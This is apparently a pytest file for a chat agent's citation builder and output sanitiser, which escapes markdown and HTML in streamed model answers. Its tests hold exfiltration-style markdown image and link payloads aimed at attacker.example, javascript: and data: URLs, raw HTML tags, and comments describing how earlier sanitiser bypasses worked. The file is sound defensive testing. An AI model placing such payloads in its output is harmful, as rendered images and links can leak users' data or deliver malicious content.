# backend/tests/test_agent_graph_citations.py
# Task 3.4.c [SECURITY]: citations (built only from the intersection of
# what the model claims to have cited and what was actually retrieved)
# and output safety (server-side markdown/HTML neutralisation on the
# model's own streamed answer text, under the append-only streaming rule
# Task 3.4.b already established).
#
# Redesigned (2026-11-12) after a live adversarial pass found the original
# recognise-and-hold-back `_StreamSanitizer` broken (cap-padding,
# reference-style, and nested-bracket bypasses -- see PROJECT_SPEC.md's
# own dated correction to the 3.4.c decision log for the full account).
# Replaced with `_sanitize_answer_text()`, a pure backslash-escape
# function -- this file's own sanitiser tests below are a full rewrite,
# not a patch, including every bypass from that adversarial pass
# converted into a permanent regression test, now checked against a REAL
# CommonMark parser's own parse tree (`markdown-it-py`, dev-only), not
# string inspection.
#
# Fakes only -- no real API call anywhere in this file, matching every
# other chat-model-adjacent test in this project.
import random

from markdown_it import MarkdownIt

import app.agent.graph as graph_module
from app.agent.graph import Citation, _build_citations, _sanitize_answer_text
from tests.conftest import FakeAnswerToolChatModel, build_fake_answer_arg_chunks

# `html=True` -- the MOST PERMISSIVE realistic config (raw HTML passed
# through), deliberately NOT relying on the widget's own future renderer
# hardening (PROJECT_SPEC.md's own new §9 marker) to prove our escaping
# alone is sufficient even against a parser that does nothing extra to
# help it.
_MD = MarkdownIt("commonmark", {"html": True})
_DANGEROUS_TOKEN_TYPES = {"image", "link_open", "html_block", "html_inline"}


def _dangerous_token_types(text: str) -> set[str]:
    """Parses `text` with a real CommonMark parser and returns which of
    the dangerous token types (an image, a live link, or raw HTML, block
    or inline) actually appear anywhere in the parse tree -- the real
    proof this task's own instruction asked for, not string inspection.
    """
    found: set[str] = set()
    for token in _MD.parse(text):
        if token.type in _DANGEROUS_TOKEN_TYPES:
            found.add(token.type)
        for child in token.children or []:
            if child.type in _DANGEROUS_TOKEN_TYPES:
                found.add(child.type)
    return found


def _chunk(document_id: str, text: str, source_url: str | None, heading_path=None) -> dict:
    return {
        "document_id": document_id,
        "text": text,
        "source_url": source_url,
        "heading_path": heading_path or [],
        "score": 0.9,
    }


# --- Citation building (_build_citations) -----------------------------------


def test_hallucinated_injected_and_real_doc_id_labels_yield_no_citation():
    retrieved = [_chunk("doc-a", "Alpha.", "https://example.com/a")]
    cited = ["c99", "doc-a", "not-a-label", "c0"]
    assert _build_citations(cited, retrieved) == []


def test_mixed_web_upload_database_citations_only_web_survives():
    retrieved = [
        _chunk("doc-web", "Web text.", "https://example.com/web"),
        _chunk("doc-upload", "Upload text.", None),
        _chunk("doc-db", "Database text.", None),
    ]
    cited = ["c1", "c2", "c3"]
    citations = _build_citations(cited, retrieved)
    assert citations == [{"url": "https://example.com/web", "heading_path": []}]


def test_citations_deduplicated_by_url():
    retrieved = [
        _chunk("doc-a", "Alpha.", "https://example.com/same"),
        _chunk("doc-b", "Beta, same page.", "https://example.com/same"),
    ]
    citations = _build_citations(["c1", "c2"], retrieved)
    assert len(citations) == 1
    assert citations[0]["url"] == "https://example.com/same"


def test_citations_defense_in_depth_only_http_https_schemes_survive():
    # Ingestion only ever stores verified-domain http(s) URLs -- this
    # proves the SECOND, independent check holds even if that upstream
    # guarantee were ever violated (a real doc_id wouldn't normally carry
    # a javascript:/data: source_url, but _build_citations() does not
    # trust that blindly).
    retrieved = [
        _chunk("doc-js", "x", "javascript:alert(1)"),
        _chunk("doc-data", "x", "data:text/html,evil"),
        _chunk("doc-ok", "x", "https://example.com/ok"),
    ]
    citations = _build_citations(["c1", "c2", "c3"], retrieved)
    assert citations == [{"url": "https://example.com/ok", "heading_path": []}]


def test_citation_includes_heading_path_but_no_invented_title_field():
    retrieved = [_chunk("doc-a", "x", "https://example.com/a", heading_path=["Section 1"])]
    citations = _build_citations(["c1"], retrieved)
    assert citations == [{"url": "https://example.com/a", "heading_path": ["Section 1"]}]
    assert set(Citation.__annotations__.keys()) == {"url", "heading_path"}


# --- Non-leak: file_name/table identity structurally absent -----------------


def test_retrieved_chunk_has_no_file_name_or_table_identity_field():
    from app.retrieval.service import RetrievedChunk

    assert set(RetrievedChunk.__annotations__.keys()) == {
        "document_id",
        "text",
        "source_url",
        "heading_path",
        "score",
    }


def test_upload_and_database_chunks_never_leak_into_the_constructed_prompt():
    # Realistic upload/database-shaped chunks (source_url=None, per the
    # real adapters' own confirmed shape, Task 3.3.a's own dated
    # follow-up) -- a distinctive sentinel standing in for what a
    # file_name/table identity would look like is deliberately NOT part
    # of any RetrievedChunk field (there is no field for it), so this
    # proves the absence structurally: the sentinel never entered the
    # function's input in the first place, confirmed by checking it
    # never appears in the rendered output either.
    retrieved = [
        _chunk("doc-upload", "Extracted upload body text, no filename mentioned.", None),
        _chunk("doc-db", "Row data rendered as text, no table name mentioned.", None),
    ]
    messages = graph_module._build_messages(retrieved, "What does the document say?")
    rendered = "\n".join(str(m.content) for m in messages)
    assert "SENTINEL_FILENAME.pdf" not in rendered
    assert "SENTINEL_TABLE_customers" not in rendered
    # And no citation at all for either (web pages only).
    citations = _build_citations(["c1", "c2"], retrieved)
    assert citations == []


# --- _sanitize_answer_text(): pure-function unit tests -----------------------


def test_each_escaped_character_maps_to_backslash_plus_itself():
    assert _sanitize_answer_text("!") == "\\!"
    assert _sanitize_answer_text("[") == "\\["
    assert _sanitize_answer_text("]") == "\\]"
    assert _sanitize_answer_text("<") == "\\<"
    assert _sanitize_answer_text(">") == "\\>"
    assert _sanitize_answer_text("\\") == "\\\\"


def test_plain_text_with_no_escaped_characters_passes_through_unchanged():
    text = "Just a perfectly ordinary sentence, with numbers 123 and punctuation: yes."
    assert _sanitize_answer_text(text) == text


def test_backslash_prefixed_bracket_still_inert():
    # The exact hazard named by direct instruction: if only "[" were
    # escaped (not "\" itself), a model emitting the raw two characters
    # "\[" would become "\" + "\[" = "\\[" -- CommonMark reads "\\" as
    # one literal backslash, leaving a FRESH, unescaped "[" live again.
    # Escaping backslash too closes this: "\[" (2 raw chars) must become
    # "\\\[" (backslash, backslash, backslash, bracket), which CommonMark
    # parses as two escape pairs -- literal "\" then literal "[" -- never
    # a live bracket. Proven against the real parser, not just asserted.
    raw = "\\[link](https://attacker.example)"
    sanitized = _sanitize_answer_text(raw)
    assert sanitized == "\\\\\\[link\\](https://attacker.example)"
    assert _dangerous_token_types(sanitized) == set()


def test_backslash_prefixed_image_marker_still_inert():
    raw = "\\![img](https://attacker.example/x.png)"
    sanitized = _sanitize_answer_text(raw)
    assert _dangerous_token_types(sanitized) == set()


def test_escape_is_split_invariant_under_random_concatenation():
    # escape(a) + escape(b) == escape(a + b) for ANY split -- this is
    # exactly 3.4.b's own append-only streaming invariant, proven to
    # hold by construction (a pure, context-free, per-character map
    # commutes with concatenation), not merely tested for one split.
    # Random splits of every adversarial string from this file, plus a
    # string of nothing but escaped characters, over a fixed seed for
    # reproducibility.
    adversarial_strings = [
        "![" + "a" * 250 + "](https://attacker.example/x?q=secret)",
        "![x][r] and elsewhere [r]: https://attacker.example/x",
        "[click][r] and elsewhere [r]: https://attacker.example",
        "[![inner](https://attacker-inner.example)](https://attacker-outer.example)",
        "[[inner](https://inner-uncited.example)](https://outer-uncited.example)",
        "\\[\\]\\!\\<\\>\\\\" * 10,
        "!" * 50 + "[" * 50 + "]" * 50 + "<" * 50 + ">" * 50 + "\\" * 50,
    ]
    rng = random.Random(20261112)  # noqa: S311 (test split-point selection, not crypto)
    for text in adversarial_strings:
        full = _sanitize_answer_text(text)
        for _ in range(20):
            split_at = rng.randint(0, len(text))
            a, b = text[:split_at], text[split_at:]
            assert _sanitize_answer_text(a) + _sanitize_answer_text(b) == full


def test_code_span_formatting_is_preserved_and_still_has_no_dangerous_constructs():
    # Decision, proven by test, not assumed: backticks are NOT escaped.
    # CommonMark disables backslash-escape processing AND markdown/raw-
    # HTML parsing entirely inside a code span's own content, so leaving
    # backticks alone cannot reopen a construct, with or without this
    # function's own escaping -- and preserves the model's ability to
    # show a literal code sample.
    text = "Use `backticks` for code"
    sanitized = _sanitize_answer_text(text)
    assert sanitized == text  # no escaped characters present, unchanged
    tokens = _MD.parse(sanitized)
    inline_children = [c for t in tokens for c in (t.children or [])]
    assert any(c.type == "code_inline" and c.content == "backticks" for c in inline_children)
    assert _dangerous_token_types(sanitized) == set()


# --- Every bypass found at this task's own adversarial pass, now a ----------
# --- permanent regression test, checked against a real parse tree ----------


def test_cap_padding_bypass_is_now_closed():
    # Original bug: a 250-char alt text (over the replaced design's own
    # 200-char hold cap) split across deltas flushed the held "![" BEFORE
    # the closing "](url)" arrived; concatenating the two pieces silently
    # reassembled a complete image. There is no cap/hold concept left to
    # trigger this: escaping is immediate and stateless.
    deltas = ["![", "a" * 100, "a" * 150, "](https://attacker.example/x?q=secret)"]
    sanitized = "".join(_sanitize_answer_text(d) for d in deltas)
    assert _dangerous_token_types(sanitized) == set()
    assert "attacker.example" in sanitized  # visible as inert plain text, not hidden


def test_reference_style_image_bypass_is_now_closed():
    # Original bug: "![x][r]" + a "[r]: url" definition line was never
    # recognised as dangerous by the replaced regex-based design at all.
    deltas = ["![x][r] and elsewhere ", "[r]: https://attacker.example/x"]
    sanitized = "".join(_sanitize_answer_text(d) for d in deltas)
    assert _dangerous_token_types(sanitized) == set()


def test_reference_style_link_bypass_is_now_closed():
    deltas = ["[click][r] and elsewhere ", "[r]: https://attacker.example"]
    sanitized = "".join(_sanitize_answer_text(d) for d in deltas)
    assert _dangerous_token_types(sanitized) == set()


def test_nested_image_in_link_text_bypass_is_now_closed():
    # Original bug: the replaced design matched the INNER image, rejected
    # its URL, emitted the captured text literally without re-scanning
    # it, then passed the leftover "](outer_url)" through unexamined --
    # the two pieces reassembled into a brand-new image around a URL
    # NEVER VALIDATED AT ALL. No regex/capture-and-emit step exists
    # anymore to reassemble.
    text = "[![inner](https://attacker-inner.example)](https://attacker-outer.example)"
    sanitized = _sanitize_answer_text(text)
    assert _dangerous_token_types(sanitized) == set()


def test_nested_link_in_link_text_bypass_is_now_closed():
    # The general root cause of the finding above, without even needing
    # the "!" image trigger -- plain nested brackets alone.
    text = "[[inner](https://inner-uncited.example)](https://outer-uncited.example)"
    sanitized = _sanitize_answer_text(text)
    assert _dangerous_token_types(sanitized) == set()


def test_javascript_and_data_urls_never_become_a_link():
    for text in (
        "[click me](javascript:alert(1))",
        "[click me](data:text/html,evil)",
        "<javascript:alert(1)>",
    ):
        sanitized = _sanitize_answer_text(text)
        assert _dangerous_token_types(sanitized) == set()


def test_raw_html_img_and_anchor_tags_are_neutralised():
    for text in (
        'before <img src="https://evil.example/x.png"> after',
        'click <a href="https://evil.example">here</a> now',
    ):
        sanitized = _sanitize_answer_text(text)
        assert _dangerous_token_types(sanitized) == set()


def test_a_cited_looking_url_also_never_survives_as_an_inline_link():
    # The new design draws no distinction between a cited and an
    # uncited URL in answer TEXT -- docs/SPEC.md §6.3 shows citations as
    # a separate, server-built "Sources shown" list (never from parsing
    # the model's own prose), so an inline link surviving for ANY URL,
    # cited or not, is not a capability this design needs to preserve.
    text = "See [the docs](https://example.com/a) for details."
    sanitized = _sanitize_answer_text(text)
    assert _dangerous_token_types(sanitized) == set()
    assert "https://example.com/a" in sanitized  # visible, just inert


# --- Full node integration: streamed text == persisted AIMessage text ------


async def test_streamed_text_equals_persisted_text_when_escaping_fires(monkeypatch):
    chunks = build_fake_answer_arg_chunks(
        can_answer=True,
        used_chunk_ids=["c1"],
        answer="See ![img](https://evil.example/x.png) and [docs](https://not-cited.example) now.",
    )
    writer_events: list = []
    monkeypatch.setattr(
        graph_module, "get_chat_model", lambda: FakeAnswerToolChatModel(arg_chunks=chunks)
    )
    monkeypatch.setattr(graph_module, "get_stream_writer", lambda: writer_events.append)

    state = {
        "messages": [],
        "retrieved_chunks": [_chunk("doc-a", "Alpha.", "https://example.com/a")],
    }
    from langchain_core.messages import HumanMessage

    state["messages"] = [HumanMessage(content="q")]

    result = await graph_module._answer_node(state)

    streamed = "".join(e["text"] for e in writer_events)
    persisted = result["messages"][0].content
    assert streamed == persisted
    # The new design does not hide the URL text -- it neutralises the
    # CONSTRUCT. The real proof is the parse tree, not string absence.
    assert _dangerous_token_types(persisted) == set()
    assert "evil.example" in persisted
    assert "not-cited.example" in persisted


async def test_streamed_text_equals_persisted_text_on_the_happy_path(monkeypatch):
    chunks = build_fake_answer_arg_chunks(
        can_answer=True, used_chunk_ids=["c1"], answer="A perfectly plain answer."
    )
    writer_events: list = []
    monkeypatch.setattr(
        graph_module, "get_chat_model", lambda: FakeAnswerToolChatModel(arg_chunks=chunks)
    )
    monkeypatch.setattr(graph_module, "get_stream_writer", lambda: writer_events.append)

    from langchain_core.messages import HumanMessage

    state = {
        "messages": [HumanMessage(content="q")],
        "retrieved_chunks": [_chunk("doc-a", "Alpha.", "https://example.com/a")],
    }
    result = await graph_module._answer_node(state)

    streamed = "".join(e["text"] for e in writer_events)
    assert streamed == result["messages"][0].content == "A perfectly plain answer."


async def test_citations_state_matches_what_was_cited_and_actually_retrieved(monkeypatch):
    chunks = build_fake_answer_arg_chunks(
        can_answer=True,
        used_chunk_ids=["c1", "c99", "c2"],  # c99 hallucinated; c2 is upload (no citation)
        answer="Combined answer from two sources.",
    )
    monkeypatch.setattr(
        graph_module, "get_chat_model", lambda: FakeAnswerToolChatModel(arg_chunks=chunks)
    )
    monkeypatch.setattr(graph_module, "get_stream_writer", lambda: (lambda e: None))

    from langchain_core.messages import HumanMessage

    state = {
        "messages": [HumanMessage(content="q")],
        "retrieved_chunks": [
            _chunk("doc-a", "Alpha.", "https://example.com/a"),
            _chunk("doc-b", "Beta (upload).", None),
        ],
    }
    result = await graph_module._answer_node(state)

    assert result["cited_chunk_labels"] == ["c1", "c99", "c2"]
    assert result["citations"] == [{"url": "https://example.com/a", "heading_path": []}]
